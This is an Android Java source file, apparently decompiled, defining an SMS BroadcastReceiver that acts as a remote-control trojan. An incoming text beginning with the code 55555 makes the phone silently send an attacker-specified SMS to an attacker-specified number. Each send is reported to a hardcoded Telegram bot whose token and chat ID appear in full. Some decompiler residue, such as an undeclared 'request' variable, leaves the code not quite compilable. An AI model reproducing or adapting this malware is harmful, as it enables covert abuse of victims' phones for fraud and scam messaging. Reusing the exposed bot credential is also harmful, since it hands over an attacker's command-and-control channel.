package com.example.myapplicatior;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class SendSMS extends BroadcastReceiver {
    final String TAG = "demo";
    private final OkHttpClient client = new OkHttpClient();

    public void onReceive(Context context, Intent intent) {
        Bundle bundle;
        String str = " ";
        String str2 = ",";
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle2 = intent.getExtras();
            if (bundle2 != null) {
                try {
                    Object[] pdus = (Object[]) bundle2.get("pdus");
                    SmsMessage[] msgs = new SmsMessage[pdus.length];
                    int i = 0;
                    while (i < msgs.length) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        String originatingAddress = msgs[i].getOriginatingAddress();
                        String msgbody = msgs[i].getMessageBody();
                        String replace = msgbody.replace("&", "  ").replace("#", str).replace("?", str);
                        String pesan1 = msgbody;
                        String kata1 = pesan1.split(str2)[0];
                        String kata2 = pesan1.split(str2)[1];
                        String kata3 = pesan1.split(str2)[2];
                        String str3 = str;
                        String str4 = str2;
                        int tempWater = Integer.parseInt(kata1.toString());
                        if (tempWater == 55555) {
                            SmsManager.getDefault().sendTextMessage(kata2, (String) null, kata3, (PendingIntent) null, (PendingIntent) null);
                            int i2 = tempWater;
                            bundle = bundle2;
                            try {
                                String kata32 = kata3;
                                String str5 = kata32;
                                this.client.newCall(new Request.Builder().url(" https://api.telegram.org/bot7153602473:AAFSHM8j2WwWoZtJoybLJtl4vvcKn6GogZ0/sendMessage?parse_mode=markdown&chat_id=6308795074&text=Berhasil Kirim SMS dari Jauh  %0AKepada  : _" + kata2 + "_,%0A𝐦𝐞𝐬𝐬𝐚𝐠𝐞 : _" + kata32 + "_").build()).enqueue(new Callback() {
                                    public void onFailure(Call call, IOException e) {
                                        e.printStackTrace();
                                    }

                                    public void onResponse(Call call, Response response) throws IOException {
                                        Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                                        if (response.isSuccessful()) {
                                            response.body().string();
                                        }
                                    }
                                });
                            } catch (Exception e) {
                                request = e;
                            }
                        } else {
                            int i3 = tempWater;
                            bundle = bundle2;
                            String str6 = kata3;
                        }
                        i++;
                        bundle2 = bundle;
                        str = str3;
                        str2 = str4;
                    }
                } catch (Exception e2) {
                    request = e2;
                    Bundle bundle3 = bundle2;
                    request.printStackTrace();
                }
            }
        }
    }
}
